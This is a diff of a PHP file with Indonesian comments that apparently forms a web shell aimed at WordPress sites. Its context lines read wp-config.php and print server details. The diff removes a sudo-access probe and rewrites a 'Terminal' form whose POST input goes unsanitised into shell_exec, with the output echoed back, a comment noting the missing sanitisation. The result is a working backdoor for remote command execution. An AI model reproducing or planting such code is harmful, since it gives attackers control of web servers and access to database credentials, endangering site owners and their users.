@@ -827,7 +827,7 @@ if ($wp_config_file) {
         }
     }
 } else {
-    echo "File wp-config.php tidak ditemukan di direktori yang ditentukan.";
+    echo "File wp-config.php tidak ditemukan.";
 }
 ?>
 <form method="post" action="">
@@ -891,40 +891,32 @@ echo "<p><strong>HTTPS:</strong> " . (isset($_SERVER['HTTPS']) ? 'Ya' : 'Tidak')
 ?>
 
 
-
-
-
-<?php
-// Jalankan perintah sudo dan cek apakah ada akses
-$output = shell_exec('sudo -v 2>&1');
-
-// Tampilkan hasilnya
-if (strpos($output, 'Sorry') !== false) {
-    echo 'Perintah sudo tidak bisa digunakan.';
-} else {
-    echo 'Perintah sudo berhasil dijalankan atau memiliki akses.';
-}
-?>
-
-
-    <form method="post">
-        <label for="command"> Terminal :</label><br>
-        <input type="text" id="command" name="command" required><br><br>
-        <input type="submit" value="Eksekusi">
-    </form>
-
+<form method="post">
+    <label for="terminalCommand"> Terminal :</label><br>
+    <input type="text" id="terminalCommand" name="terminalCommand" required><br><br>
+    <input type="submit" value="Eksekusi">
+</form>
 
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $command = $_POST['command'];
+    // Mengambil input tanpa pembersihan
+    $terminalCommand = trim($_POST['terminalCommand']);
     
-    // Jalankan perintah terminal
-    $output = shell_exec($command);
+    // Menjalankan perintah terminal
+    $output = shell_exec($terminalCommand);
     
-    // Tampilkan output dari perintah yang dijalankan
-    echo "<pre>$output</pre>";
+    // Menampilkan output dari perintah yang dijalankan
+    if ($output === null) {
+        // Mendapatkan informasi kesalahan terakhir
+        $error = error_get_last();
+        echo "<pre>Perintah tidak dapat dieksekusi atau tidak valid. Kesalahan: " . htmlspecialchars($error['message']) . "</pre>";
+    } else {
+        echo "<pre>$output</pre>";
+    }
 }
 ?>
+
+
 
 
 
